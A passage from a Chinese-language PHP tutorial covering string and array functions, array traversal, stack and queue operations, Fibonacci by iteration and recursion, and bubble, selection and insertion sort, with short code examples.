使用一个字符串分割另一个字符串<br>str_split — 将字符串转换为数组</p></blockquote></li><li><p>处理函数</p><blockquote><p>trim — 去除字符串首尾处(两边)的空白字符（或者其他字符）<br>ltrim — 删除字符串开头(左边)的空白字符（或其他字符）<br>rtrim — 删除字符串末端(右边)的空白字符（或者其他字符）</p></blockquote></li><li><p>截取函数</p><blockquote><p>substr — 从某位置截取指定长度的字符串<br>strstr — 查找字符串的首次出现并截取之后的全部字符串</p></blockquote></li><li><p>大小写函数</p><blockquote><p>strtolower — 将字符串转化为小写<br>strtoupper — 将字符串转化为大写<br>ucfirst — 将字符串的首字母转换为大写</p></blockquote></li><li><p>查找函数</p><blockquote><p>strpos — 查找字符串首次出现的位置&#x2F;&#x2F;可能返回0，判断false使用&#x3D;&#x3D;&#x3D;<br>strrpos — 查找字符串最后一次出现的位置&#x2F;&#x2F;可能返回0，判断false使用&#x3D;&#x3D;&#x3D;</p></blockquote></li><li><p>字符串替换</p><blockquote><p>str_replace — 子字符串替换</p></blockquote></li><li><p>格式化函数</p><blockquote><p>printf — 输出格式化字符串<br>sprintf — 返回格式化字符串</p></blockquote></li><li><p>其他函数</p><blockquote><p>str_repeat — 重复一个字符串<br>str_shuffle — 随机打乱一个字符串<br>strlen — 获取字符串长度</p></blockquote></li></ol><h2 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h2><h3 id="数组概念"><a href="#数组概念" class="headerlink" title="数组概念"></a>数组概念</h3><p>数组[array]：数据的组合，指将一组数据存储到一个指定的容器中，用变量指向该容器，然后通过变量一次性得到该容器中的所有数据。</p><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><ul><li>索引数组：下标全为整数的数组</li><li>关联数组：下标标全为字符串的数组</li><li>混合数组：下标存在整数和字符串的数组</li></ul><h3 id="PHP数组定义"><a href="#PHP数组定义" class="headerlink" title="PHP数组定义"></a>PHP数组定义</h3><ol><li><p>使用array关键词</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//array([ mixed $...] ) : array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;China&#x27;</span>,<span class="number">71</span>,<span class="string">&#x27;good&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(3) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(5) &quot;China&quot;</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">  int(71)</span></span><br><span class="line"><span class="comment">  [2]=&gt;</span></span><br><span class="line"><span class="comment">  string(4) &quot;good&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li><li><p>使用中括号定义</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;China&#x27;</span>,<span class="number">71</span>,<span class="string">&#x27;good&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(3) &#123;</span></span><br><span class="line"><span class="comment">    [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(5) &quot;China&quot;</span></span><br><span class="line"><span class="comment">    [1]=&gt;</span></span><br><span class="line"><span class="comment">  int(71)</span></span><br><span class="line"><span class="comment">  [2]=&gt;</span></span><br><span class="line"><span class="comment">  string(4) &quot;good&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="3"><li>隐写定义</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span>[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$array</span>[] = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$array</span>[<span class="number">4</span>] = <span class="number">3</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//该方式可以指定下标，可以是字符串和数字；如果不指定下标，则使用递增下标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(3) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  int(1)</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">  int(2)</span></span><br><span class="line"><span class="comment">  [4]=&gt;</span></span><br><span class="line"><span class="comment">  int(3)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>定义多维数组<br>多维数组就是数组里的数组，理论上有N维数组<br>多维数组调用方式：$array[一维下标][二维下标]</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Say &#x27;</span>,[<span class="string">&#x27;goodbye &#x27;</span>,<span class="string">&#x27;to&#x27;</span>,[<span class="string">&#x27;the&#x27;</span> ,[<span class="string">&#x27;depravation &#x27;</span>,<span class="string">&#x27;of &#x27;</span>,[<span class="string">&#x27;yesterday&#x27;</span>,<span class="string">&#x27;I love you!&#x27;</span>]]]],<span class="string">&#x27;bey!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>];       <span class="comment">//I love you!</span></span><br></pre></td></tr></table></figure><h3 id="PHP数组特点"><a href="#PHP数组特点" class="headerlink" title="PHP数组特点"></a>PHP数组特点</h3><ol><li>可以整数下标和字符串下标</li><li>不同下标可以混合存在</li><li>数组元素的顺序以放入顺序wei’zhun</li><li>数字下标的自增长特性</li><li>特殊值下标的转换</li></ol><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p>PHP遍历数组有专门的函数，也可以使用for之类的循环函数变量；如果是多维数组，可以进行嵌套遍历。</p><ol><li>使用foreac遍历</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Jim&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">30</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">25</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;His name is &#x27;</span>.<span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;, age is &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;age&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//His name is Jim, age is 30</span></span><br><span class="line"><span class="comment">//His name is Tom, age is 25</span></span><br></pre></td></tr></table></figure><ol start="2"><li>for循环遍历数组<blockquote><p>for函数只能遍历索引数组</p></blockquote></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Jim&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">30</span>),</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">25</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$len</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;His name is &#x27;</span>.<span class="variable">$arr</span>[<span class="variable">$i</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27; and age is &#x27;</span> . <span class="variable">$arr</span>[<span class="variable">$i</span>][<span class="string">&#x27;age&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//His name is Jim and age is 30</span></span><br><span class="line"><span class="comment">//His name is Tom and age is 25</span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用while、each、list函数遍历</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">11</span>,<span class="number">3</span>,<span class="number">5</span>,);</span><br><span class="line"><span class="variable">$bool</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>(<span class="variable">$key</span>,<span class="variable">$value</span>) = @<span class="title function_ invoke__">each</span>(<span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key is &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; and value is &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//key is 0 and value is 11</span></span><br><span class="line"><span class="comment">//key is 1 and value is 3</span></span><br><span class="line"><span class="comment">//key is 2 and value is 5</span></span><br></pre></td></tr></table></figure><h3 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h3><ol><li>排序函数，通过ASCII码比较</li></ol><blockquote><p>sort — 对数组排序<br>rsort — 对数组逆向排序<br>asort — 对数组进行排序并保持索引关系<br>arsort — 对数组进行逆向排序并保持索引关系<br>ksort — 对数组按照键名排序，本函数主要用于关联数组。<br>krsort — 对数组按照键名逆向排序，主要用于结合数组。<br>shuffle — 随机打乱数组</p></blockquote><ol start="2"><li>指针函数</li></ol><blockquote><p>reset — 将数组的内部指针指向第一个单元<br>end — 将数组的内部指针指向最后一个单元<br>next — 将数组中的内部指针向前移动一位<br>prev — 将数组的内部指针倒回一位<br>current — 返回数组中的当前指针键值<br>key — 从关联数组中取得当前指针键名</p></blockquote><ol start="3"><li>其他函数</li></ol><blockquote><p>count — 计算数组中的单元数目，或对象中的属性个数<br>array_push — 将一个或多个单元压入数组的末尾（入栈）<br>array_pop — 弹出数组最后一个单元（出栈）<br>array_shift — 将数组开头的单元移出数组<br>array_unshift — 在数组开头插入一个或多个单元<br>array_reverse — 返回单元顺序相反的数组<br>in_array — 检查数组中是否存在某个值<br>is_array — 检测变量是否是数组<br>array_keys — 返回数组中部分的或所有的键名<br>array_values — 返回数组中所有的值</p></blockquote><h3 id="数组出入栈"><a href="#数组出入栈" class="headerlink" title="数组出入栈"></a>数组出入栈</h3><p>压栈：先进栈的后出栈，都是从一端出来<br>从前面压栈&#x3D;array_unshift&#x2F;array_shift<br>从后面压栈&#x3D;array_push&#x2F;array_pop</p><p>队列：先进栈的先出栈，一端进，一端出<br>前进后出&#x3D;array_unshift&#x2F;array_pop<br>后进前出&#x3D;array_push&#x2F;array_shift</p><h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><p><strong>编程思想：如何利用数学模式来解决对应的需求问题；然后利用代码实现对应的数据模型(逻辑)<br>算法：利用代码实现对应的数学模型，从而解决对应的业务问题。</strong></p><h3 id="递推算法"><a href="#递推算法" class="headerlink" title="递推算法"></a>递推算法</h3><p>递推算法是一种简单的算法，即通过已知条件，利用特定关系得出中间推论，直至得到结果的算法。通过最简单已知条件逐步推演结果称为顺推，反之通过结果找到规律推出已知条件成为逆推。</p><p><strong>悲波那契数列：1 1 2 3 5 8 13 …</strong><br>需求：找到第50个数是多少</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$n = 1;</span></span><br><span class="line"><span class="comment">$j = 1;</span></span><br><span class="line"><span class="comment">$n = $j + $n; //2</span></span><br><span class="line"><span class="comment">$j = $n - $j;</span></span><br><span class="line"><span class="comment">echo $n , &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">$n = $j + $n; //3</span></span><br><span class="line"><span class="comment">$j = $n - $j;</span></span><br><span class="line"><span class="comment">echo $n , &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">$n = $j + $n; //5</span></span><br><span class="line"><span class="comment">$j = $n - $j;</span></span><br><span class="line"><span class="comment">echo $n , &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">$n = $j + $n; //8</span></span><br><span class="line"><span class="comment">$j = $n - $j;</span></span><br><span class="line"><span class="comment">echo $n , &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">$n = $j + $n; //13</span></span><br><span class="line"><span class="comment">$j = $n - $j;</span></span><br><span class="line"><span class="comment">echo $n , &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>,<span class="variable">$n</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="number">50</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="variable">$j</span> + <span class="variable">$n</span>;</span><br><span class="line">    <span class="variable">$j</span> = <span class="variable">$n</span> - <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h3><p>递归算法是把问题转化为规模缩小了的同类子问题，然后递归调用函数或过程来表示问题的解。递归的本质就是函数调用自己：一个函数需要开辟一块内存空间，递归会出现同时调用N个函数(自己)，所以该算法是使用空间换时间。</p><p>递归点：发现当前问题可以有解决当前问题的函数，去解决规模比当前小的我问题来解决<br>递归出口：当问题解决的时候，已经到达最优子问题，不能再次调用函数</p><p><strong>悲波那契数列：1 1 2 3 5 8 13 …</strong><br>需求：找到第50个数是多少</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_n</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> == <span class="number">1</span> || <span class="variable">$n</span> == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">get_n</span>(<span class="variable">$n</span> - <span class="number">1</span>) + <span class="title function_ invoke__">get_n</span>(<span class="variable">$n</span> - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_n</span>(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><h2 id="数组排序算法"><a href="#数组排序算法" class="headerlink" title="数组排序算法"></a>数组排序算法</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>它重复地走访过要排序的元素列，依次比较两个相邻的元素，如果顺序（如从大到小、首字母从Z到A）错误就把他们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;lemon&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;apple&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">shuffle</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_sort</span>(<span class="params"><span class="variable">$arr</span>,<span class="variable">$bool</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="variable">$len</span> - <span class="number">1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$len</span> - <span class="variable">$i</span> - <span class="number">1</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$j</span>] &lt; <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$j</span> + <span class="number">1</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>( <span class="title function_ invoke__">my_sort</span>(<span class="variable">$arr</span>,<span class="literal">true</span>));</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>选择排序（Selection sort）是一种简单直观的排序算法。它的工作原理是：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="title function_ invoke__">shuffle</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">//选择排序</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$len</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$min</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="variable">$i</span>+<span class="number">1</span>;<span class="variable">$j</span>&lt;<span class="variable">$len</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$min</span>]) &#123;</span><br><span class="line">            <span class="variable">$min</span> = <span class="variable">$j</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$min</span> != <span class="variable">$i</span>)&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$min</span>];</span><br><span class="line">        <span class="variable">$arr</span>[<span class="variable">$min</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>插入排序，一般也被称为直接插入排序。对于少量元素的排序，它是一个有效的算法。插入排序是一种最简单的排序方法，它的基本思想是将一个记录插入到已经排好序的有序表中，从而一个新的、记录数增1的有序表。在其实现过程使用双层循环，外层循环对除了第一个元素之外的所有元素，内层循环对当前元素前面有序表进行待插入位置查找，并进行移动  。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">7</span>);</span><br><span class="line"><span class="comment">// 1、   确定要插入多少次(假设一个数组一次性插入到正确的位置、第一个位置是对的)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">// 2、   取出当前要插入的元素的值</span></span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="comment">// 3、   让该数据和前面已经排好序的全部值比较</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="variable">$i</span> - <span class="number">1</span>;<span class="variable">$j</span> &gt;= <span class="number">0</span>;<span class="variable">$j</span>--)&#123;</span><br><span class="line">        <span class="comment">//  4、  如果要插入的值比前面一个大，就交换位置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$j</span>] &lt; <span class="variable">$tmp</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span 